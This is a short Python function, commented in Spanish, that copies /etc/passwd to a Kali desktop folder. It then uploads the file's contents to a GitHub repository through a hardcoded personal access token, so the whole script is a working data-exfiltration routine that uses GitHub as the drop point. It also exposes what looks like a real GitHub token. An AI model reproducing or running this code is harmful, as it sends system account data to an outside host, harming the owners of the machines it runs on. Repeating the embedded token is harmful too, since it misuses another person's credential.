
def run():
    # Copiar /etc/passwd a /home/kali/Desktop
    subprocess.run(['cp', '/etc/passwd', '/home/kali/Desktop'])
    
    # Definir la variable GITHUB_REPO
    GITHUB_REPO = 'almacenlar'  # No es necesario cambiar esto, ya que es el nombre del repositorio principal
    
    ACCESS_TOKEN = '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'
    
    g = Github(ACCESS_TOKEN)
    
    repo = g.get_user().get_repo(GITHUB_REPO)
    all_files = []
    contents = repo.get_contents("almacenlar")  # Cambiado para acceder a la carpeta almacenlar en el repositorio
    while contents:
        file_content = contents.pop(0)
        if file_content.type == "dir":
            contents.extend(repo.get_contents(file_content.path))
        else:
            file = file_content
            all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))
    
    with open('/home/kali/Desktop/passwd', 'r') as file:
        content = file.read()
    
    # Upload to github
    git_prefix = 'lauraalmrui/'
    git_file = git_prefix + 'almacenlar/passwd'  # Cambiado para reflejar la estructura de carpetas en el repositorio
    if git_file in all_files:
        contents = repo.get_contents(git_file)
        repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
        print(git_file + ' UPDATED')
    else:
        repo.create_file(git_file, "committing files", content, branch="master")
        print(git_file + ' CREATED')



